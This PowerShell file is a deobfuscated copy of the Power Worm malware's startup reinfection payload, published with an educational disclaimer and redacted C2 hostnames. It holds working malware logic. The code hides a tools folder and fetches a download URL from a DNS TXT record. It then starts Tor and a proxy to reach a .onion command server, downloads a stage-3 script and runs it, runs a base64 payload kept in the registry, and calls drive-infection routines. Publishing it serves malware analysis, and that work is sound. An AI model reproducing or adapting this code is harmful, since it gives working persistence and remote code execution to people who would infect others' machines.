<#
TERMS OF USE: Considering I am not the original author of this malware, I
cannot apply any formal license to this work. I can, however, apply a
gentleman's clause to the use of this script which is dictated as follows:

DBAD Clause v0.1
----------------
Don't be a douche. This malware has little to no legitimate use and as such, I
reserve the right to publicly shame you if you are caught using this for
malicious purposes. The sole purpose of publishing this malware is to inform
and educate.

Lastly, I have redacted portions of the malware where necessary. Redactions
will be evident in the code.
#>

<#
This is the fully deobfuscated and cleaned up version of the payload that was persisted via a VBScript located here:
"$($Env:APPDATA)\$((Get-WmiObject Win32_ComputerSystemProduct).UUID)\$((Get-WmiObject Win32_ComputerSystemProduct).UUID).vbs"

The purpose of this payload is reinfect the machine a startup.
#>

# Ignore all errors
$ErrorActionPreference = 'SilentlyContinue'

# The machine GUID is used throughout Power Worm
$MachineGuid = (Get-WmiObject Win32_ComputerSystemProduct).UUID

# If the payload is already persisted in the registry, kill 
if ((Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run) -match $MachineGuid)
{
    Get-Process -Id $PID | Stop-Process
}

# This function retrieves a URI from a DNS TXT record, downloads a zip file, and extracts it
function Get-DnsTXTRecord($DnsHost)
{
    $ZipFileUri = (((Invoke-Expression "nslookup -querytype=txt $DnsHost 8.8.8.8") -match '"') -replace '"', '')[0].Trim()
    $WebClient.DownloadFile($ZipFileUri, $ZipPath)
    $Destination = $Shell.NameSpace($ZipPath).Items();
    # Decompress files
    $Shell.NameSpace($ToolsPath).CopyHere($Destination, 20)
    Remove-Item $ZipPath
}

$ToolsPath = Join-Path $Env:APPDATA $MachineGuid

# Mark the path where tools are extracted as 'Hidden', 'System', 'NotContentIndexed'
if (!(Test-Path $ToolsPath))
{
    $Directory = New-Item -ItemType Directory -Force -Path $ToolsPath
    $Directory.Attributes = 'Hidden', 'System', 'NotContentIndexed'
}

$Tor = Join-Path $ToolsPath 'tor.exe'
$Polipo = Join-Path $ToolsPath 'polipo.exe'
$ZipPath = Join-Path $ToolsPath ($MachineGuid + '.zip')
$WebClient = New-Object Net.WebClient
$Shell = New-Object -ComObject Shell.Application

if (!(Test-Path $Tor) -or !(Test-Path $Polipo))
{
    Get-DnsTXTRecord 'REDACTEDREDACTED.de'
}

if (!(Test-Path $Tor) -or !(Test-Path $Polipo))
{
    Get-DnsTXTRecord 'REDACTEDREDACTED.cc'
}

$TorRoamingLog = Join-Path $ToolsPath 'roaminglog'
# Start Tor and maintain an initialization log file
Start-Process $Tor -ArgumentList " --Log `"notice file $TorRoamingLog`"" -WindowStyle Hidden

# Wait for Tor to finish initializing
do
{
    Start-Sleep 1
    $LogContents = Get-Content $TorRoamingLog
}
while (!($LogContents -match 'Bootstrapped 100%: Done.'))

# Start polipo proxy
Start-Process $Polipo -ArgumentList 'socksParentProxy=localhost:9050' -WindowStyle Hidden
Start-Sleep 7
$WebProxy = New-Object Net.WebProxy('localhost:8123')
$WebProxy.UseDefaultCredentials = $True
$WebClient.Proxy = $WebProxy

$Stage3Uri = 'http://REDACTEDREDACTED.onion/get.php?s=autorun&uid=' + $MachineGuid

# In my analysis, I was never able to coax the C2 server into providing a stage 3 payload.
while (!$Stage3Payload)
{
    $Stage3Payload=$WebClient.downloadString($Stage3Uri)
}

if ($Stage3Payload -ne 'none')
{
    # Execute the stage 3 payload
    Invoke-Expression $Stage3Payload
}

$RegistryPayload3 = (Get-ItemProperty HKCU:\Software\Microsoft).($MachineGuid + '1')

Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($RegistryPayload3)))

Start-ExistingDriveInfection
Start-NewDriveInfection